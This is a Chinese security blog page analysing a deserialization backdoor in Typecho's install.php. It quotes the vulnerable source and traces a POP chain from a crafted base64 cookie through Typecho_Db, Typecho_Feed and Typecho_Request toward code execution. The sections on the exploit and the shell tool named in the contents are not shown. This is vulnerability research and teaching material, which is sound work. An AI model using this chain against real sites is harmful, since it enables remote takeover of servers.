<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>Typecho-install.php 后门代码分析 | Www.ChaBug.Org</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="chabug,查bug,博客,寻找bug,初遇,chuyu,社区,Web,软件,分享,免费" />
  

  <meta name="description" content="前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的. 然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。 恶意代码 base64解码后反序列化cookie中传入的__typecho_config参数， 然后让__typecho_config作为构造参数例化一个Typecho_Db类， 接着通过POP链进行代码执行。  涉及到的文件还有类名 i">
<meta property="og:type" content="article">
<meta property="og:title" content="Typecho-install.php 后门代码分析">
<meta property="og:url" content="http://www.chabug.org/2017/11/03/typecho-install/index.html">
<meta property="og:site_name" content="Www.ChaBug.Org">
<meta property="og:description" content="前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的. 然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。 恶意代码 base64解码后反序列化cookie中传入的__typecho_config参数， 然后让__typecho_config作为构造参数例化一个Typecho_Db类， 接着通过POP链进行代码执行。  涉及到的文件还有类名 i">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2017-11-03T02:11:30.885Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Typecho-install.php 后门代码分析">
<meta name="twitter:description" content="前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的. 然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。 恶意代码 base64解码后反序列化cookie中传入的__typecho_config参数， 然后让__typecho_config作为构造参数例化一个Typecho_Db类， 接着通过POP链进行代码执行。  涉及到的文件还有类名 i">

  

  
    <link rel="icon" href="/favicon.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?e7d0b4f222c86066771d7246bd3dd18c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">菜单</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">菜单</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            归档
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/atom.xml"
            rel="noopener noreferrer"
            target="_blank"
            >
            RSS
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="CIRCLE"
            href="/search/"
            rel="noopener noreferrer"
            target="_self"
            >
            搜索
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#恶意代码"><span class="toc-text">恶意代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#install-php"><span class="toc-text">install.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Db-php"><span class="toc-text">Db.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feed-php"><span class="toc-text">Feed.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Request-php"><span class="toc-text">Request.php</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#编写payload的简单思路"><span class="toc-text">编写payload的简单思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GetShell小工具"><span class="toc-text">GetShell小工具</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-typecho-install" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">Typecho-install.php 后门代码分析</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2017.11.03</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>ChaBug</span>
        </span>
      

      


      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      

      
      
    </div>
  </header>

  <div class="article-content">
    
      <p>前几天的typecho爆的漏洞接二连三，我原本是想用typecho做博客的.</p>
<p>然后吓得我赶紧换了git+hexo。今天分析下这个install.php中的后门。</p>
<h1 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h1><ol>
<li>base64解码后反序列化cookie中传入的__typecho_config参数，</li>
<li>然后让__typecho_config作为构造参数例化一个Typecho_Db类，</li>
<li>接着通过POP链进行代码执行。</li>
</ol>
<p>涉及到的文件还有类名</p>
<p>install.php（unserialize） – &gt;  Db.php（class Typecho_Db）  – &gt;  Feed.php （class Typecho_Feed） – &gt;  Request.php （class Typecho_Request）</p>
<h2 id="install-php"><a href="#install-php" class="headerlink" title="install.php"></a>install.php</h2><ol>
<li>设置了正确的referer（网站url即可）</li>
<li>加上一个任意的finish参数</li>
<li>设置cookie中__typecho_config字段的值</li>
</ol>
<p>cookie中的__typecho_config得到序列化后的$config数组字符串,<br>反序列化后，再使用$config[‘adapter’]作为构造参数传入Typecho_Db的实例化过程。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>])) : <span class="meta">?&gt;</span></div><div class="line">               <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!@file_exists(__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>)) : <span class="meta">?&gt;</span></div><div class="line">               &lt;h1 class="typecho-install-title"&gt;&lt;?php _e('安装失败!'); ?&gt;&lt;/h1&gt;</div><div class="line">               &lt;div class="typecho-install-body"&gt;</div><div class="line">                   &lt;form method=<span class="string">"post"</span> action=<span class="string">"?config"</span> name=<span class="string">"config"</span>&gt;</div><div class="line">                   &lt;p class="message error"&gt;&lt;?php _e('您没有上传 config.inc.php 文件，请您重新安装！'); ?&gt; &lt;button class="btn primary" type="submit"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class="line">                   &lt;/form&gt;</div><div class="line">               &lt;/div&gt;</div><div class="line">               <span class="meta">&lt;?php</span> <span class="keyword">elseif</span> (!Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)): <span class="meta">?&gt;</span></div><div class="line">               &lt;h1 class="typecho-install-title"&gt;&lt;?php _e('没有安装!'); ?&gt;&lt;/h1&gt;</div><div class="line">               &lt;div class="typecho-install-body"&gt;</div><div class="line">                   &lt;form method=<span class="string">"post"</span> action=<span class="string">"?config"</span> name=<span class="string">"config"</span>&gt;</div><div class="line">                   &lt;p class="message error"&gt;&lt;?php _e('您没有执行安装步骤，请您重新安装！'); ?&gt; &lt;button class="btn primary" type="submit"&gt;&lt;?php _e('重新安装 »'); ?&gt;&lt;/button&gt;&lt;/p&gt;</div><div class="line">                   &lt;/form&gt;</div><div class="line">               &lt;/div&gt;</div><div class="line">               <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></div><div class="line">                   <span class="meta">&lt;?php</span></div><div class="line">                   $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</div><div class="line">                   Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</div><div class="line">                   $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</div><div class="line">                   $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</div><div class="line">                   Typecho_Db::set($db);</div><div class="line">                   <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="Db-php"><a href="#Db-php" class="headerlink" title="Db.php"></a>Db.php</h2><p>$config[‘adapter’]在构造函数里面对应形参$adapterName,<br>$adapterName是Typecho_Feed类的实例，使用.字符连接就调用__toString魔术方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="comment">/** 获取适配器名称 */</span></div><div class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</div><div class="line"></div><div class="line">        <span class="comment">/** 数据库适配器 */</span></div><div class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</div><div class="line"></div><div class="line">        <span class="comment">/** 初始化内部变量 */</span></div><div class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</div><div class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</div><div class="line"></div><div class="line">        <span class="comment">//实例化适配器对象</span></div><div class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<h2 id="Feed-php"><a href="#Feed-php" class="headerlink" title="Feed.php"></a>Feed.php</h2><p><code>$this-&gt;_type</code>用来控制if语句的流程，<br>给<code>$this-&gt;_type</code> 赋值 ATOM 1.0时，<br>即可进入包含$item[‘author’]-&gt;screenName的分支，<br>$item[‘author’]这个变量是一个Typecho_Request的实例,<br>我们可以设置这个Typecho_Request实例的属性screenName是一个私有属性，<br>当访问$item[‘author’]-&gt;screenName就会调用__get方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $result = <span class="string">'&lt;?xml version="1.0" encoding="'</span> . <span class="keyword">$this</span>-&gt;_charset . <span class="string">'"?&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">self</span>::RSS1 == <span class="keyword">$this</span>-&gt;_type) &#123;</div><div class="line">            $result .= <span class="string">'&lt;rdf:RDF</span></div><div class="line"><span class="string">xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"</span></div><div class="line"><span class="string">xmlns="http://purl.org/rss/1.0/"</span></div><div class="line"><span class="string">xmlns:dc="http://purl.org/dc/elements/1.1/"&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $content = <span class="string">''</span>;</div><div class="line">            $links = <span class="keyword">array</span>();</div><div class="line">            $lastUpdate = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</div><div class="line">                $content .= <span class="string">'&lt;item rdf:about="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'"&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;dc:date&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/dc:date&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;description&gt;'</span> . strip_tags($item[<span class="string">'content'</span>]) . <span class="string">'&lt;/description&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'suffix'</span>])) &#123;</div><div class="line">                    $content .= $item[<span class="string">'suffix'</span>];</div><div class="line">                &#125;</div><div class="line">                $content .= <span class="string">'&lt;/item&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">                $links[] = $item[<span class="string">'link'</span>];</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ($item[<span class="string">'date'</span>] &gt; $lastUpdate) &#123;</div><div class="line">                    $lastUpdate = $item[<span class="string">'date'</span>];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $result .= <span class="string">'&lt;channel rdf:about="'</span> . <span class="keyword">$this</span>-&gt;_feedUrl . <span class="string">'"&gt;</span></div><div class="line"><span class="string">&lt;title&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_title) . <span class="string">'&lt;/title&gt;</span></div><div class="line"><span class="string">&lt;link&gt;'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'&lt;/link&gt;</span></div><div class="line"><span class="string">&lt;description&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_subTitle) . <span class="string">'&lt;/description&gt;</span></div><div class="line"><span class="string">&lt;items&gt;</span></div><div class="line"><span class="string">&lt;rdf:Seq&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> ($links <span class="keyword">as</span> $link) &#123;</div><div class="line">                $result .= <span class="string">'&lt;rdf:li resource="'</span> . $link . <span class="string">'"/&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $result .= <span class="string">'&lt;/rdf:Seq&gt;</span></div><div class="line"><span class="string">&lt;/items&gt;</span></div><div class="line"><span class="string">&lt;/channel&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $result .= $content . <span class="string">'&lt;/rdf:RDF&gt;'</span>;</div><div class="line"></div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">self</span>::RSS2 == <span class="keyword">$this</span>-&gt;_type) &#123;</div><div class="line">            $result .= <span class="string">'&lt;rss version="2.0"</span></div><div class="line"><span class="string">xmlns:content="http://purl.org/rss/1.0/modules/content/"</span></div><div class="line"><span class="string">xmlns:dc="http://purl.org/dc/elements/1.1/"</span></div><div class="line"><span class="string">xmlns:slash="http://purl.org/rss/1.0/modules/slash/"</span></div><div class="line"><span class="string">xmlns:atom="http://www.w3.org/2005/Atom"</span></div><div class="line"><span class="string">xmlns:wfw="http://wellformedweb.org/CommentAPI/"&gt;</span></div><div class="line"><span class="string">&lt;channel&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $content = <span class="string">''</span>;</div><div class="line">            $lastUpdate = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</div><div class="line">                $content .= <span class="string">'&lt;item&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars($item[<span class="string">'title'</span>]) . <span class="string">'&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;link&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/link&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;guid&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/guid&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'category'</span>]) &amp;&amp; is_array($item[<span class="string">'category'</span>])) &#123;</div><div class="line">                    <span class="keyword">foreach</span> ($item[<span class="string">'category'</span>] <span class="keyword">as</span> $category) &#123;</div><div class="line">                        $content .= <span class="string">'&lt;category&gt;&lt;![CDATA['</span> . $category[<span class="string">'name'</span>] . <span class="string">']]&gt;&lt;/category&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'excerpt'</span>])) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;description&gt;&lt;![CDATA['</span> . strip_tags($item[<span class="string">'excerpt'</span>]) . <span class="string">']]&gt;&lt;/description&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'content'</span>])) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;content:encoded xml:lang="'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'"&gt;&lt;![CDATA['</span></div><div class="line">                    . <span class="keyword">self</span>::EOL .</div><div class="line">                    $item[<span class="string">'content'</span>] . <span class="keyword">self</span>::EOL .</div><div class="line">                    <span class="string">']]&gt;&lt;/content:encoded&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($item[<span class="string">'comments'</span>]) &amp;&amp; strlen($item[<span class="string">'comments'</span>]) &gt; <span class="number">0</span>) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;slash:comments&gt;'</span> . $item[<span class="string">'comments'</span>] . <span class="string">'&lt;/slash:comments&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                $content .= <span class="string">'&lt;comments&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'#comments&lt;/comments&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'commentsFeedUrl'</span>])) &#123;</div><div class="line">                    $content .= <span class="string">'&lt;wfw:commentRss&gt;'</span> . $item[<span class="string">'commentsFeedUrl'</span>] . <span class="string">'&lt;/wfw:commentRss&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($item[<span class="string">'suffix'</span>])) &#123;</div><div class="line">                    $content .= $item[<span class="string">'suffix'</span>];</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                $content .= <span class="string">'&lt;/item&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ($item[<span class="string">'date'</span>] &gt; $lastUpdate) &#123;</div><div class="line">                    $lastUpdate = $item[<span class="string">'date'</span>];</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            $result .= <span class="string">'&lt;title&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_title) . <span class="string">'&lt;/title&gt;</span></div><div class="line"><span class="string">&lt;link&gt;'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'&lt;/link&gt;</span></div><div class="line"><span class="string">&lt;atom:link href="'</span> . <span class="keyword">$this</span>-&gt;_feedUrl . <span class="string">'" rel="self" type="application/rss+xml" /&gt;</span></div><div class="line"><span class="string">&lt;language&gt;'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'&lt;/language&gt;</span></div><div class="line"><span class="string">&lt;description&gt;'</span> . htmlspecialchars(<span class="keyword">$this</span>-&gt;_subTitle) . <span class="string">'&lt;/description&gt;</span></div><div class="line"><span class="string">&lt;lastBuildDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($lastUpdate) . <span class="string">'&lt;/lastBuildDate&gt;</span></div><div class="line"><span class="string">&lt;pubDate&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($lastUpdate) . <span class="string">'&lt;/pubDate&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $result .= $content . <span class="string">'&lt;/channel&gt;</span></div><div class="line"><span class="string">&lt;/rss&gt;'</span>;</div><div class="line"></div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">self</span>::ATOM1 == <span class="keyword">$this</span>-&gt;_type) &#123;</div><div class="line">            $result .= <span class="string">'&lt;feed xmlns="http://www.w3.org/2005/Atom"</span></div><div class="line"><span class="string">xmlns:thr="http://purl.org/syndication/thread/1.0"</span></div><div class="line"><span class="string">xml:lang="'</span> . <span class="keyword">$this</span>-&gt;_lang . <span class="string">'"</span></div><div class="line"><span class="string">xml:base="'</span> . <span class="keyword">$this</span>-&gt;_baseUrl . <span class="string">'"</span></div><div class="line"><span class="string">&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line"></div><div class="line">            $content = <span class="string">''</span>;</div><div class="line">            $lastUpdate = <span class="number">0</span>;</div><div class="line"></div><div class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</div><div class="line">                $content .= <span class="string">'&lt;entry&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;title type="html"&gt;&lt;![CDATA['</span> . $item[<span class="string">'title'</span>] . <span class="string">']]&gt;&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;link rel="alternate" type="text/html" href="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'" /&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;id&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/id&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;updated&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/updated&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;published&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/published&gt;'</span> . <span class="keyword">self</span>::EOL;</div><div class="line">                $content .= <span class="string">'&lt;author&gt;</span></div><div class="line"><span class="string">    &lt;name&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;screenName . <span class="string">'&lt;/name&gt;</span></div><div class="line"><span class="string">    &lt;uri&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;url . <span class="string">'&lt;/uri&gt;</span></div><div class="line"><span class="string">&lt;/author&gt;'</span> . <span class="keyword">self</span>::EOL;</div></pre></td></tr></table></figure></p>
<h2 id="Request-php"><a href="#Request-php" class="headerlink" title="Request.php"></a>Request.php</h2><p>Typecho_Request实例调用__get魔术方法，进入get方法,最后进入_applyFilter方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
